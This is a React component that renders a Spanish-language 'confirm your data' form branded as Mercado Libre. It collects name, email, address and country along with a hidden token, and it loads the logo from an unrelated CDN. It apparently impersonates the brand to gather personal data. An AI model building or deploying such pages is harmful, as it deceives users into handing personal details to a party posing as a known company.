import React from 'react';

interface Locale {
  country: string;
  lang: string;
  region: string;
}

export interface SSRFormProps {
  user: {
    name: string;
    email: string;
    address: string;
    country: string;
  };
  countries: Array<{
    code: string;
    name: string;
  }>;
  referrer: string;
  token: string;
  locale?: Locale;
  translations?: any;
}

export function SSRForm({ user, countries, referrer, token, locale, translations }: SSRFormProps) {
      const lang = locale?.lang.split('-')[0] || 'es';
    const t = translations || { title: 'Confirma tus datos', subtitle: 'Formulario', loading: 'Cargando...' };
  
    return (
      <html lang={lang}>
        <head>
          <meta charSet="UTF-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>{t.title} - Mercado Libre</title>
        <style dangerouslySetInnerHTML={{
          __html: `
            body {
              margin: 0;
              background-color: #f9fafb;
              font-family: sans-serif;
              display: flex;
              flex-direction: column;
              min-height: 100vh;
            }

            header {
              background-color: #fde047;
              padding: 0.75rem 1rem;
            }

            header img {
              height: 32px;
              display: block;
              margin: 0 auto;
            }

            @media (min-width: 768px) {
              header div {
                display: flex;
                justify-content: flex-start;
                max-width: 1024px;
                margin: 0 auto;
              }

              header img {
                margin-left: 0;
              }
            }

            main {
              flex: 1;
              display: flex;
              justify-content: center;
              align-items: center;
              padding: 3rem 1rem;
            }

            .form-container {
              width: 440px;
              background-color: white;
              border-radius: 0.75rem;
              padding: 2rem;
              box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            }

            h2 {
              font-size: 1.5rem;
              font-weight: bold;
              text-align: center;
              margin-bottom: 1.5rem;
            }

            label {
              font-weight: 500;
              margin-bottom: 0.25rem;
              display: block;
            }

            input,
            select {
              width: 100%;
              padding: 0.5rem 0.75rem;
              border-radius: 0.375rem;
              border: 1px solid #d1d5db;
              margin-bottom: 1.25rem;
              box-sizing: border-box;
            }

            button {
              width: 100%;
              background-color: #2563eb;
              color: white;
              padding: 0.5rem;
              border-radius: 0.375rem;
              border: none;
              font-weight: 600;
              cursor: pointer;
              transition: background-color 0.2s ease;
            }

            button:hover {
              background-color: #1e40af;
            }
          `
        }} />
      </head>
      <body>
        <header>
          <div>
            <img
              src="https://static.vscdn.net/images/careers/demo/mercadolibre/1641314597::New+PCS+logp"
              alt="Mercado Libre"
            />
          </div>
        </header>

        <main>
          <div className="form-container">
            <h2>{t.title}</h2>
            <form method="POST" action="/verify-data-ssr">
              <input type="hidden" name="referrer" value={referrer} />
              <input type="hidden" name="token" value={token} />

              <div>
                <label>Nombre</label>
                <input 
                  type="text" 
                  name="name" 
                  defaultValue={user.name} 
                  required 
                />
              </div>

              <div>
                <label>Email</label>
                <input 
                  type="email" 
                  name="email" 
                  defaultValue={user.email} 
                  required 
                />
              </div>

              <div>
                <label>Dirección</label>
                <input 
                  type="text" 
                  name="address" 
                  defaultValue={user.address} 
                  required 
                />
              </div>

              <div>
                <label>País</label>
                <select name="country" required>
                  {countries.map(country => (
                    <option 
                      key={country.code} 
                      value={country.code}
                      {...(user.country === country.code && { selected: true })}
                    >
                      {country.name}
                    </option>
                  ))}
                </select>
              </div>
              <button type="submit">Confirmar</button>
            </form>
          </div>
        </main>
      </body>
    </html>
  );
} 